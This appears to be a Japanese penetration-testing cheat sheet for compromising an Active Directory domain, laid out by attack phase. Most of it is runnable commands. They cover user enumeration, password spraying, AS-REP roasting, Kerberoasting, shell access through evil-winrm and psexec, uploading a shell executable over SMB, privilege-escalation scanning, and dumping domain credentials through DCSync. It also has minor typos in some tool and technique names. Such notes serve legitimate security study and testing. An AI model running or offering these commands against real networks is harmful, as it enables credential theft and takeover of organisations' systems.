
### Procedure
-----
1. 偵察・情報収集（Reconnaissance）
2. 初期侵入（Inital Access）
3. 認証情報の取得（Credential Access）
4. 横展開（Lateral Movement）
5. 権限昇格（Privilege Escalation）
6. ドメイン支配（Domain Dominance）

<br>

#### 1. 偵察・情報収集（Reconnaissance）/ 2. 初期侵入（Inital Access）
- ユーザ名の列挙
  - 手法：Kerberos Pre-Authentication、LDAL匿名バインド、SMB Null Session
  - ツール：kerbrute、enum4linux、crackmapexec
  - 目的：有効なユーザアカウントのリスト作成
```bash
# Kerberosを使ったユーザ列挙
kerbrute userenum --dc <IP> -d DOMAIN.LOCAL users.txt

# enum4linuxを用いたユーザ列挙
enum4linux -U -S -G -P -o <IP>
# -U：ユーザ一覧取得 / -S：共有フォルダ一覧取得 / -G：グループ一覧取得 / -P：パスワードポリシー取得

# 認証情報を使用したenum4linux
enum4linux -U "user" -p "password" -a <IP>

# crackmapexecを用いた列挙
crackmapexec smb <IP> -u '' -p '' --shares
# --users：ユーザ一覧取得 / --shares：共有フォルダ一覧取得 / --groups：グループ一覧取得 / --local-auth：ローカル管理者権限チェック

# crackmapexecを用いたPWスプレー攻撃
crackmapexec smb <IP> -u users.txt -p 'P@ssw0rd' --continue-on-success
crackmapexec smb <IP> -u users.txt -p passwords.txt --no-bruteforce
```
- SMB/LDAP情報収集
  - 手法：共有フォルダの列挙、グループポリシーの確認
  - ツール：smbmap、smbclient、ldapsearch
  - 目的：共有リソースや組織構造の把握
```bash
# smbmapでの列挙
smbmap -H <IP> -u USER -p PASSWORD
smbmap -H <IP> -u USER -p PASSWORD --download 'SYSVOL\file.txt' # ファイルダウンロード
smbmap -H <IP> -u USER -p PASSWORD --upload 'shell.exe' 'C$\temp\shell.exe' # ファイルアップロード

# smbclientでの接続
smbclient -L //<IP> -N # 匿名接続でリスト表示
smbclient -L //<IP> -U USERS%PASSWORD

# ldapsearchを用いたLDAP列挙
ldapsearch -x -H ldap://<IP> -s base namingcontexts # 匿名バインドでの基本情報取得
ldapsearch -x -H ldap://<IP> -b "DC=*******,DC=LOCAL" # ドメイン情報取得
```

<br>

#### 3. 認証情報の取得（Credential Access）
- AS-REP Roasting
  - 原理：Kerberos事前認証が無効なユーザに対して、PWハッシュを含むTGTを要求
  - ツール：GetNPUsers.py
  - 対策：全てのユーザに事前認証を要求する設定にする
```bash
GetNPUsers.py DOMAIN/username -no-pass -dc-ip <IP>
```
- Kerberoasting
  - 原理：サービスアカウント（SPN設定済み）のTGSチケットを要求し、オフラインでクラック
  - ツール：GetUserSPNs.py、Rubeus
  - 特徴：ドメイン参加済みの認証情報が必要だが非常に効果的
```bash
GetUserSPNs.py DOMAIN/user:password -dc-ip <IP> -request
```

<br>

#### 4. 横展開（Lateral Movement）
- 初回シェル取得
```bash
evil-winrm -i <IP> -u USER -p PASSWORD # WinRM経由
impacket-psexec corp.local/USER:PASSWORD@<IP> # SMB経由
# -H HASH：PWでなくハッシュ指定も可能
```

<br>

#### 5. 権限昇格（Privilege Escalation）
- 権限昇格スクリプト
```bash
.\winPEASx64.exe
```

<br>

#### 6. ドメイン支配（Domain Dominance）
- DCSynx攻撃
```bash
impacket-secretdump corp.local/svc_admin:PASSWORD@<IP>
```

-----
### BloodHound
AD環境の権限関係を可視化するツール
```bash
# BloodHound起動
bloodhound
```

- 情報収集
```bash
bloodhound-python -u USER -p PASSWORD -d corp.local -ns <IP> -c ALL
```
